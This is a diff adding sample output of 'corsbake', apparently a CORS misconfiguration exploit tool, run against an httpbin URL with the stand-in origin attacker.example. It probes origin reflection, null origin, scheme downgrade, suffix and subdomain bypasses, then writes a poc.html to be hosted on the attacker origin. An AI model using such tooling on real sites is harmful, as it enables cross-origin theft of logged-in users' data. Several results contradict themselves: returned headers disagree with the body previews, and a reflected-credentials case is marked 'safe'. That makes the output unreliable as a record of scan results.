@@ -1,0 +1,64 @@
+# python3 cli.py --url 'https://httpbin.org/response-headers?Access-Control-Allow-Origin=https://attacker.example&Access-Control-Allow-Credentials=true' --attacker-origin 'https://attacker.example' --cookie 'sess=demo123' --out ./poc.html
+
+════════════════════════════════════════════════════════════════
+corsbake  https://httpbin.org/response-headers?Access-Control-Allow-Origin=https://attacker.example&Access-Control-Allow-Credentials=true
+════════════════════════════════════════════════════════════════
+
+  target           https://httpbin.org/response-headers?Access-Control-Allow-Origin=https://attacker.example&Access-Control-Allow-Credentials=true
+  attacker origin  https://attacker.example
+  victim auth      cookie
+  exfil sink       (none, output stays in browser)
+
+▣ exact-origin reflection
+     origin sent     https://attacker.example
+     the textbook misconfig: server reflects the requesting Origin verbatim
+     ACAO returned   https://attacker.example
+     ACAC returned   true
+     verdict         VULNERABLE  ACAO reflects attacker origin and credentials allowed
+     body preview    '{   "Access-Control-Allow-Credentials": "true",    "Access-Control-Allow-Origin": "https://attacker.example",    "Conten'
+
+▣ null origin
+     origin sent     null
+     sandboxed iframe / redirect / file:// page sends Origin: null
+     ACAO returned   null
+     ACAC returned   true
+     verdict         VULNERABLE  null origin accepted with credentials
+     body preview    '{   "Access-Control-Allow-Credentials": "true",    "Access-Control-Allow-Origin": "https://attacker.example",    "Conten'
+
+▢ wildcard with credentials
+     origin sent     https://random.example
+     ACAO=* with ACAC=true is a spec-banned combo browsers will reject, but plenty of clients honor it
+     ACAO returned   https://random.example
+     ACAC returned   true
+     verdict         safe  safe (acao=https://random.example, acac=yes)
+
+▣ scheme downgrade
+     origin sent     http://attacker.example
+     server allows http origin while target is https; MITM attack vector
+     ACAO returned   http://attacker.example
+     ACAC returned   true
+     verdict         VULNERABLE  http origin accepted while target is https
+     body preview    '{   "Access-Control-Allow-Credentials": "true",    "Access-Control-Allow-Origin": "https://attacker.example",    "Conten'
+
+▣ suffix bypass
+     origin sent     https://httpbin.org.attacker.example
+     regex like ^https://victim\.com checks suffix and accepts attacker-controlled host
+     ACAO returned   https://httpbin.org.attacker.example
+     ACAC returned   true
+     verdict         VULNERABLE  regex permitted attacker-suffixed host
+     body preview    '{   "Access-Control-Allow-Credentials": "true",    "Access-Control-Allow-Origin": "https://attacker.example",    "Conten'
+
+▣ subdomain wildcard
+     origin sent     https://evil.httpbin.org
+     any-subdomain wildcard accepted as if it were a trusted subdomain
+     ACAO returned   https://evil.httpbin.org
+     ACAC returned   true
+     verdict         VULNERABLE  any-subdomain accepted as trusted
+     body preview    '{   "Access-Control-Allow-Credentials": "true",    "Access-Control-Allow-Origin": "https://attacker.example",    "Conten'
+
+════════════════════════════════════════════════════════════════
+  artifact
+     written  poc.html  (1465 bytes)
+     serve    python3 -m http.server 8080 --directory /root/published_tools/corsbake
+     open     https://attacker.example/poc.html
+════════════════════════════════════════════════════════════════
